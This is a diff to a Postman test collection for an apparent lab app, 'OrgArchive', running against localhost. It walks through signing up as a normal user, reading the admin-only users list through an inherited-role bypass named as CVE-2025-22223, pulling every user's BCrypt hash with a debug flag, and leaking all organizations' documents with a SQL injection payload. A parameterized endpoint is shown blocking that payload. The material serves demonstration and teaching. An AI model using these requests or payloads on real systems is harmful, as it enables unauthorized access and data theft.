@@ -1,7 +1,7 @@
 {
   "info": {
     "name": "OrgArchive — signup to cross-organization document access",
-    "description": "Run in order. Anna uses a deliberately weak lab password. The password is already stored in the collection variable annaPassword; explain its offline match to the leaked BCrypt hash without a live cracking step.",
+    "description": "Run the 11 requests in order. Sign up as a normal user, use CVE 1 to read the admin-only users list, then search documents as Anna. Anna’s weak lab password is already set in annaPassword.",
     "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
   },
   "variable": [
@@ -10,19 +10,15 @@
       "value": "http://localhost:8080"
     },
     {
-      "key": "visitorUsername",
+      "key": "username",
       "value": ""
     },
     {
-      "key": "visitorPassword",
+      "key": "password",
       "value": ""
     },
     {
-      "key": "visitorOrganization",
-      "value": ""
-    },
-    {
-      "key": "annaHash",
+      "key": "userOrganization",
       "value": ""
     },
     {
@@ -32,7 +28,7 @@
   ],
   "item": [
     {
-      "name": "1 · Discover OrgArchive API",
+      "name": "1 · Discover API endpoints",
       "request": {
         "method": "GET",
         "url": "{{gatewayUrl}}/",
@@ -57,7 +53,7 @@
       ]
     },
     {
-      "name": "2 · Anonymous users → 401",
+      "name": "2 · Anonymous /users → 401",
       "request": {
         "method": "GET",
         "url": "{{gatewayUrl}}/users",
@@ -79,7 +75,7 @@
       ]
     },
     {
-      "name": "3 · Anonymous notes → 401",
+      "name": "3 · Anonymous /notes → 401",
       "request": {
         "method": "GET",
         "url": "{{gatewayUrl}}/notes",
@@ -101,7 +97,7 @@
       ]
     },
     {
-      "name": "4 · Sign up for a new organization",
+      "name": "4 · Sign up as a normal user",
       "request": {
         "method": "POST",
         "url": "{{gatewayUrl}}/signup",
@@ -117,7 +113,7 @@
         ],
         "body": {
           "mode": "raw",
-          "raw": "{\n  \"username\": \"{{visitorUsername}}\",\n  \"displayName\": \"Demo Visitor\",\n  \"email\": \"{{visitorUsername}}@example.test\",\n  \"password\": \"{{visitorPassword}}\"\n}",
+          "raw": "{\n  \"username\": \"{{username}}\",\n  \"displayName\": \"Demo User\",\n  \"email\": \"{{username}}@example.test\",\n  \"password\": \"{{password}}\"\n}",
           "options": {
             "raw": {
               "language": "json"
@@ -132,8 +128,8 @@
             "type": "text/javascript",
             "exec": [
               "const suffix = Math.random().toString(36).slice(2, 10);",
-              "pm.collectionVariables.set('visitorUsername', 'visitor-' + suffix);",
-              "pm.collectionVariables.set('visitorPassword', 'VisitorPass!' + suffix + '9');"
+              "pm.collectionVariables.set('username', 'user-' + suffix);",
+              "pm.collectionVariables.set('password', 'UserPass!' + suffix + '9');"
             ]
           }
         },
@@ -144,31 +140,31 @@
             "exec": [
               "pm.response.to.have.status(201);",
               "const account = pm.response.json();",
-              "pm.expect(account.username).to.equal(pm.collectionVariables.get('visitorUsername'));",
+              "pm.expect(account.username).to.equal(pm.collectionVariables.get('username'));",
               "pm.expect(account.organization).to.match(/^trial-/);",
-              "pm.collectionVariables.set('visitorOrganization', account.organization);"
+              "pm.collectionVariables.set('userOrganization', account.organization);"
             ]
           }
         }
       ]
     },
     {
-      "name": "5 · Own organization notes → empty",
+      "name": "5 · My organization notes → empty",
       "request": {
         "method": "GET",
-        "url": "{{gatewayUrl}}/organizations/{{visitorOrganization}}/notes",
+        "url": "{{gatewayUrl}}/organizations/{{userOrganization}}/notes",
         "description": "",
         "auth": {
           "type": "basic",
           "basic": [
             {
               "key": "username",
-              "value": "{{visitorUsername}}",
+              "value": "{{username}}",
               "type": "string"
             },
             {
               "key": "password",
-              "value": "{{visitorPassword}}",
+              "value": "{{password}}",
               "type": "string"
             }
           ]
@@ -188,56 +184,22 @@
       ]
     },
     {
-      "name": "6 · Other organization notes → 403",
-      "request": {
-        "method": "GET",
-        "url": "{{gatewayUrl}}/organizations/atlas-consulting/notes",
-        "description": "",
-        "auth": {
-          "type": "basic",
-          "basic": [
-            {
-              "key": "username",
-              "value": "{{visitorUsername}}",
-              "type": "string"
-            },
-            {
-              "key": "password",
-              "value": "{{visitorPassword}}",
-              "type": "string"
-            }
-          ]
-        }
-      },
-      "event": [
-        {
-          "listen": "test",
-          "script": {
-            "type": "text/javascript",
-            "exec": [
-              "pm.response.to.have.status(403);"
-            ]
-          }
-        }
-      ]
-    },
-    {
-      "name": "7 · Regular roster response → no hashes",
+      "name": "6 · CVE 1 · Normal user accesses admin /users",
       "request": {
         "method": "GET",
         "url": "{{gatewayUrl}}/users",
-        "description": "CVE-2025-22223: the inherited admin role annotation is missed for this regular account.",
+        "description": "First unauthorized access: the newly registered USER receives the admin-only user list because CVE-2025-22223 skips the inherited role check.",
         "auth": {
           "type": "basic",
           "basic": [
             {
               "key": "username",
-              "value": "{{visitorUsername}}",
+              "value": "{{username}}",
               "type": "string"
             },
             {
               "key": "password",
-              "value": "{{visitorPassword}}",
+              "value": "{{password}}",
               "type": "string"
             }
           ]
@@ -250,30 +212,35 @@
             "type": "text/javascript",
             "exec": [
               "pm.response.to.have.status(200);",
-              "pm.expect(pm.response.json().some(u => u.username === 'anna')).to.be.true;",
-              "pm.expect(pm.response.text()).not.to.include('passwordHash');"
+              "const users = pm.response.json();",
+              "pm.expect(users).to.be.an('array');",
+              "pm.expect(users.length).to.be.above(0);",
+              "pm.expect(users.some(u => u.username === 'anna')).to.be.true;",
+              "pm.expect(users.some(u => u.role === 'admin')).to.be.true;",
+              "pm.expect(users.find(u => u.username === 'anna').organization).to.equal('atlas-consulting');",
+              "pm.expect(users.some(u => u.organization === 'harbor-delivery')).to.be.true;"
             ]
           }
         }
       ]
     },
     {
-      "name": "8 · Admin debug roster → Anna hash",
+      "name": "7 · Users with debug flag → password hashes",
       "request": {
         "method": "GET",
         "url": "{{gatewayUrl}}/users?debug=true",
-        "description": "Save Anna’s BCrypt hash in annaHash for the explanation. annaPassword is a prefilled lab fixture (sunshine); no password cracking runs in Postman.",
+        "description": "The debug=true flag exposes BCrypt hashes for every user. Anna’s weak password is already stored in the collection variable annaPassword for the next requests.",
         "auth": {
           "type": "basic",
           "basic": [
             {
               "key": "username",
-              "value": "{{visitorUsername}}",
+              "value": "{{username}}",
               "type": "string"
             },
             {
               "key": "password",
-              "value": "{{visitorPassword}}",
+              "value": "{{password}}",
               "type": "string"
             }
           ]
@@ -286,50 +253,16 @@
             "type": "text/javascript",
             "exec": [
               "pm.response.to.have.status(200);",
-              "const anna = pm.response.json().find(u => u.username === 'anna');",
-              "pm.expect(anna.passwordHash).to.match(/^\\$2[aby]\\$/);",
-              "pm.collectionVariables.set('annaHash', anna.passwordHash);"
+              "const users = pm.response.json();",
+              "pm.expect(users.length).to.be.above(1);",
+              "users.forEach(u => pm.expect(u.passwordHash).to.match(/^\\$2[aby]\\$/));"
             ]
           }
         }
       ]
     },
     {
-      "name": "9 · Direct admin user lookup → 403",
-      "request": {
-        "method": "GET",
-        "url": "{{gatewayUrl}}/users/anna",
-        "description": "A directly annotated admin method remains protected; the visitor did not gain an admin role.",
-        "auth": {
-          "type": "basic",
-          "basic": [
-            {
-              "key": "username",
-              "value": "{{visitorUsername}}",
-              "type": "string"
-            },
-            {
-              "key": "password",
-              "value": "{{visitorPassword}}",
-              "type": "string"
-            }
-          ]
-        }
-      },
-      "event": [
-        {
-          "listen": "test",
-          "script": {
-            "type": "text/javascript",
-            "exec": [
-              "pm.response.to.have.status(403);"
-            ]
-          }
-        }
-      ]
-    },
-    {
-      "name": "10 · Normal Atlas document search",
+      "name": "8 · Anna document search → own organization",
       "request": {
         "method": "POST",
         "url": "{{gatewayUrl}}/documents/search",
@@ -357,7 +290,7 @@
         ],
         "body": {
           "mode": "raw",
-          "raw": "{\n  \"query\": \"report\",\n  \"organization\": \"atlas-consulting\"\n}",
+          "raw": "{\n  \"organization\": \"atlas-consulting\"\n}",
           "options": {
             "raw": {
               "language": "json"
@@ -381,7 +314,7 @@
       ]
     },
     {
-      "name": "11 · Foreign organization search → empty",
+      "name": "9 · Anna searches another organization → empty",
       "request": {
         "method": "POST",
         "url": "{{gatewayUrl}}/documents/search",
@@ -409,7 +342,7 @@
         ],
         "body": {
           "mode": "raw",
-          "raw": "{\n  \"query\": \"report\",\n  \"organization\": \"harbor-delivery\"\n}",
+          "raw": "{\n  \"organization\": \"harbor-delivery\"\n}",
           "options": {
             "raw": {
               "language": "json"
@@ -431,7 +364,7 @@
       ]
     },
     {
-      "name": "12 · SQL injection → all organizations",
+      "name": "10 · CVE 2 · SQL injection reveals all organizations",
       "request": {
         "method": "POST",
         "url": "{{gatewayUrl}}/documents/search",
@@ -459,7 +392,7 @@
         ],
         "body": {
           "mode": "raw",
-          "raw": "{\n  \"query\": \"report\",\n  \"organization\": \"atlas-consulting' OR '1'='1\"\n}",
+          "raw": "{\n  \"organization\": \"atlas-consulting' OR '1'='1\"\n}",
           "options": {
             "raw": {
               "language": "json"
@@ -483,7 +416,7 @@
       ]
     },
     {
-      "name": "13 · Safe query → empty",
+      "name": "11 · Safe search with the same input → empty",
       "request": {
         "method": "POST",
         "url": "{{gatewayUrl}}/documents/search-safe",
@@ -511,7 +444,7 @@
         ],
         "body": {
           "mode": "raw",
-          "raw": "{\n  \"query\": \"report\",\n  \"organization\": \"atlas-consulting' OR '1'='1\"\n}",
+          "raw": "{\n  \"organization\": \"atlas-consulting' OR '1'='1\"\n}",
           "options": {
             "raw": {
               "language": "json"
